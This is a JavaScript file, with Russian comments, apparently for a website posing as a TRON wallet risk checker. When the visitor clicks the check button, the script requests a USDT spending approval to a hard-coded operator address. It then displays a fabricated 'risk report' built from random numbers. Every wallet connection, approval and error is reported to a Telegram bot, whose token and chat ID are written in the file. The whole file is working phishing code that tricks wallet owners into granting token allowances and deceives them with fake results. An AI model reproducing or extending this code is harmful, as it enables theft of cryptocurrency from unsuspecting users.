// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – АВТОМАТИЧЕСКОЕ ПЕРЕКЛЮЧЕНИЕ УЗЛОВ
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

// Telegram
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// Список узлов для автоматического переключения [citation:1][citation:2]
const NODES = [
    'https://api.trongrid.io',
    'https://api.tronstack.io', 
    'https://rpc.ankr.com/tron_jsonrpc',
    'https://api.trongrid.pro',
    'https://tron-mainnet.token.im'
];

let connectedWalletAddress = null;
let connectionAttempts = 0;
let currentNodeIndex = 0; // Для переключения узлов

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendTelegramMessage(text) {
    try {
        console.log('📤 Отправка в Telegram...');
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Уведомление отправлено');
        } else {
            console.error('❌ Ошибка Telegram:', result.description);
        }
    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
    }
}

// ============================================
// ФУНКЦИЯ ПЕРЕКЛЮЧЕНИЯ УЗЛА
// ============================================
async function switchNode() {
    currentNodeIndex = (currentNodeIndex + 1) % NODES.length;
    const newNode = NODES[currentNodeIndex];
    
    console.log(`🔄 Переключаюсь на узел: ${newNode}`);
    
    // Пробуем обновить узел в TronLink если возможно
    if (window.tronLink && window.tronLink.tronWeb) {
        try {
            // Для TronLink Pro
            if (window.tronLink.tronWeb.setFullNode) {
                window.tronLink.tronWeb.setFullNode(newNode);
                window.tronLink.tronWeb.setSolidityNode(newNode);
                window.tronLink.tronWeb.setEventServer(newNode);
            }
        } catch (e) {
            console.log('Не удалось сменить узел программно');
        }
    }
    
    return newNode;
}

// ============================================
// УНИВЕРСАЛЬНОЕ ПОДКЛЮЧЕНИЕ
// ============================================
async function connectWallet() {
    console.log('🔌 Попытка подключения кошелька...');
    connectionAttempts++;
    
    try {
        // TronLink (новая версия)
        if (window.tronLink) {
            console.log('✅ TronLink обнаружен');
            
            // Проверяем уже подключённый
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                const address = window.tronLink.tronWeb.defaultAddress.base58;
                if (address && address !== 'false') {
                    connectedWalletAddress = address;
                    walletInput.value = address;
                    if (statusSpan) statusSpan.style.display = 'inline-flex';
                    
                    sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                    alert('✅ TronLink подключён!');
                    return;
                }
            }
            
            // Запрашиваем подключение
            try {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                
                let attempts = 0;
                const checkInterval = setInterval(() => {
                    if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                        const address = window.tronLink.tronWeb.defaultAddress.base58;
                        if (address && address !== 'false') {
                            connectedWalletAddress = address;
                            walletInput.value = address;
                            if (statusSpan) statusSpan.style.display = 'inline-flex';
                            
                            sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                            alert('✅ TronLink подключён!');
                            clearInterval(checkInterval);
                        }
                    }
                    attempts++;
                    if (attempts > 20) clearInterval(checkInterval);
                }, 300);
                
            } catch (requestError) {
                console.error('Ошибка запроса:', requestError);
                if (requestError.message.includes('4001')) {
                    alert('❌ Вы отклонили подключение');
                } else {
                    throw requestError;
                }
            }
            return;
        }
        
        // Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            console.log('✅ Trust Wallet обнаружен');
            
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
            if (window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.defaultAddress) {
                const address = window.trustwallet.tronLink.tronWeb.defaultAddress.base58;
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                
                sendTelegramMessage(`🔌 <b>Подключён Trust Wallet</b>\n<code>${address}</code>`);
                alert('✅ Trust Wallet подключён!');
                return;
            }
        }
        
        // TronWeb напрямую
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            if (address && address !== 'false') {
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                
                sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
                alert('✅ Кошелёк подключён!');
                return;
            }
        }
        
        // Ничего не найдено
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (connectionAttempts === 1) {
            if (isMobile) {
                alert('📱 На телефоне:\n1. Откройте TronLink\n2. Перейдите во встроенный браузер (DApp Browser)\n3. Введите адрес сайта\n4. Нажмите "Подключить" снова');
            } else {
                alert('💻 На компьютере:\n1. Установите расширение TronLink\n2. Создайте кошелёк\n3. Обновите страницу');
            }
        } else {
            alert('❌ Кошелёк не найден. Убедитесь, что TronLink установлен и разблокирован.');
        }
        
    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE (С АВТОПЕРЕКЛЮЧЕНИЕМ)
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        // Определяем tronWeb
        let tronWeb = null;
        
        if (window.tronLink && window.tronLink.tronWeb) {
            tronWeb = window.tronLink.tronWeb;
        } else if (window.trustwallet && window.trustwallet.tronLink) {
            tronWeb = window.trustwallet.tronLink.tronWeb;
        } else if (window.tronWeb) {
            tronWeb = window.tronWeb;
        }

        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        console.log('🔄 TronWeb получен');
        
        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        try {
            // Пробуем отправить с текущим узлом
            const tx = await contract.approve(
                BOT_ADDRESS,
                amount
            ).send({
                feeLimit: 600_000_000,
                callValue: 0,
                shouldPollResponse: true,
                timeout: 120000
            });

            checkBtn.disabled = false;
            checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

            await sendTelegramMessage(`
✅ <b>✅ Approve успешно отправлен!</b>

📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
⏰ Время: ${new Date().toLocaleString()}
            `);

            showDemoReport(connectedWalletAddress);

        } catch (firstError) {
            // Если ошибка сети, пробуем переключить узел
            if (firstError.message.includes('Network Error') || 
                firstError.message.includes('timeout') ||
                firstError.message.includes('request aborted')) {
                
                console.log('⚠️ Ошибка сети, пробую переключить узел...');
                
                // Переключаем узел
                const newNode = await switchNode();
                
                // Отправляем уведомление о переключении
                await sendTelegramMessage(`
🔄 <b>Автоматическое переключение узла</b>

🌐 Новый узел: ${newNode}
📬 Адрес: <code>${connectedWalletAddress}</code>
⏰ Время: ${new Date().toLocaleString()}

⏱ Пожалуйста, подтвердите транзакцию в течение 2 минут.
                `);
                
                // Пробуем снова с новым узлом
                const tx = await contract.approve(
                    BOT_ADDRESS,
                    amount
                ).send({
                    feeLimit: 600_000_000,
                    callValue: 0,
                    shouldPollResponse: true,
                    timeout: 120000
                });

                checkBtn.disabled = false;
                checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

                await sendTelegramMessage(`
✅ <b>✅ Approve успешно отправлен (после переключения узла)!</b>

📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🌐 Узел: ${newNode}
🔗 TX: https://tronscan.org/#/transaction/${tx}
⏰ Время: ${new Date().toLocaleString()}
                `);

                showDemoReport(connectedWalletAddress);
            } else {
                // Если ошибка не сетевая, пробрасываем дальше
                throw firstError;
            }
        }

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        // Определяем тип ошибки
        let errorType = 'unknown';
        let recommendation = '';
        
        if (error.message.includes('Transaction expired')) {
            errorType = '⏱ Транзакция устарела';
            recommendation = 'Подтверждайте approve быстрее (у вас есть 2 минуты). Попробуйте снова.';
        } else if (error.message.includes('Network Error')) {
            errorType = '🌐 Ошибка сети';
            recommendation = 'Проблемы с подключением.\n\n' +
                           '✅ Бот автоматически переключил узел.\n' +
                           '👉 Попробуйте ещё раз прямо сейчас.\n' +
                           '✅ Убедитесь, что интернет работает.\n' +
                           '✅ Если ошибка повторяется, перезапустите TronLink.';
        } else if (error.message.includes('request aborted')) {
            errorType = '⚠️ Сбой запроса';
            recommendation = 'Нехватка энергии или сети. Попробуйте снова через 10 секунд.';
        } else if (error.message.includes('timeout')) {
            errorType = '⏱ Таймаут';
            recommendation = 'Сеть перегружена. Попробуйте через минуту.';
        } else if (error.message.includes('revert')) {
            errorType = '❌ Откат';
            recommendation = 'Проверьте баланс USDT и allowance.';
        } else if (error.message.includes('user rejected')) {
            errorType = '👤 Отмена';
            recommendation = 'Вы отклонили транзакцию.';
        } else if (error.message.includes('insufficient')) {
            errorType = '💰 Недостаточно средств';
            recommendation = 'Пополните баланс TRX для комиссии.';
        }
        
        // Отправляем ошибку в Telegram
        await sendTelegramMessage(`
❌ <b>Ошибка approve</b>

🔧 Тип: ${errorType}
📝 Сообщение: ${error.message}
📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
⏰ Время: ${new Date().toLocaleString()}

💡 <b>Рекомендация:</b> ${recommendation}
        `);
        
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('✅ Адрес скопирован');
}

// ============================================
// ПРОВЕРКА ПРИ ЗАГРУЗКЕ
// ============================================
function checkExistingWallet() {
    console.log('🔍 Проверка существующего кошелька...');
    
    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
        const address = window.tronLink.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий TronLink:', address);
        }
    }
    else if (window.tronWeb && window.tronWeb.defaultAddress) {
        const address = window.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий кошелёк:', address);
        }
    }
}

// ============================================
// ТЕСТ TELEGRAM
// ============================================
window.testTelegram = async function() {
    await sendTelegramMessage(`
🧪 <b>Тестовое сообщение</b>

✅ Связь работает
⏰ ${new Date().toLocaleString()}
    `);
    alert('✅ Тест отправлен, проверьте Telegram');
};

// ============================================
// ЗАПУСК
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Сайт загружен');
    
    setTimeout(checkExistingWallet, 1000);
    
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.copyAddress = copyAddress;
    
    setTimeout(() => {
        sendTelegramMessage(`
🚀 <b>Сайт загружен</b>
📱 Устройство: ${navigator.userAgent.includes('Mobile') ? 'Мобильное' : 'Компьютер'}
⏱ Время на approve: 2 минуты
💰 feeLimit: 60 TRX
🌐 Узлов в ротации: ${NODES.length}
⏰ ${new Date().toLocaleString()}
        `);
    }, 3000);
});
